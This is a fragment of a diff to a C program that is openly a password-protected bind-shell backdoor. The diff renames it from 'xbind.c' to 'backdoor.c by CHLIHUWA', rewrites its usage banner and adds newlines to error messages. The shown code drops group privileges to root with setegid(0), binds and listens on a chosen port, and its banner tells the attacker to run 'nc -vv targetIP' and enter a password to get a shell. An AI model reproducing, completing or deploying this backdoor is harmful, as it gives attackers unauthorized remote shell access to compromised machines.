@@ -29,14 +29,14 @@ int main(int argc, char **argv)
 	setegid(0);
 
 	if (argc != 2) {
-		printf("=================================\r\n");
-		printf("|xbind.c by xy7[B.C.T]\r\n");
-		printf("|Usage:\r\n");
-		printf("|./xbind 1985\r\n");
-		printf("|nc -vv targetIP 1985\r\n");
-		printf("|enter the password to get shell\r\n");
-		printf("|Have a nice day;)\r\n");
-		printf("=================================\r\n");
+		printf("=================================\n");
+		printf("|backdoor.c by CHLIHUWA\n");
+		printf("|Usage:\n");
+		printf("|./backdoor 12345\n");
+		printf("|nc -vv targetIP 12345\n");
+		printf("|enter the password to get shell\n");
+		printf("|Have a nice day;)\n");
+		printf("=================================\n");
 		exit(1);
 	}
 
@@ -47,7 +47,7 @@ int main(int argc, char **argv)
 
 	sock_descriptor = socket(AF_INET,SOCK_STREAM,0);
 	if (socket(AF_INET, SOCK_STREAM, 0) == -1) {
-		printf("socket failed!");
+		printf("socket failed!\n");
 		exit(1);
 	}
 
@@ -57,13 +57,13 @@ int main(int argc, char **argv)
 	s_addr.sin_port = htons(atoi(argv[1]));
 	
 	if (bind(sock_descriptor,(struct sockaddr*)&s_addr,sizeof(s_addr)) == -1) {
-		printf("bind failed!");
+		printf("bind failed!\n");
 		exit(1);
 	}
 
 	if (listen(sock_descriptor, 20) == -1)//accept 20 connections
 	{
-		printf("listen failed!");
+		printf("listen failed!\n");
 		exit(1);
 	}
 
